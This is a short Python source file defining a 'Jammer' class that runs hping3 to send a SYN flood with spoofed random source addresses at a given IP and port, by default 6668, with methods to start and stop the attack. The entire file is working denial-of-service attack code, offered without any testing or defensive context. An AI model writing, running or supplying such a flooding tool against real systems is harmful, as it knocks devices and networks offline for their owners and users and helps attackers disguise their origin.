import subprocess
import os
import signal

class Jammer:
    def __init__(self, target_ip, port=6668):
        self.target_ip = target_ip
        self.port = port
        self.process = None

    def start_attack(self):
        command = [
            'hping3', '--syn', '--rand-source', '--flood',
            '-p', str(self.port), self.target_ip
        ]
        self.process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"Jamming attack started on {self.target_ip}:{self.port}")

    def stop_attack(self):
        if self.process:
            os.kill(self.process.pid, signal.SIGINT)
            self.process.wait()
            print(f"Jamming attack stopped on {self.target_ip}:{self.port}")
            self.process = None
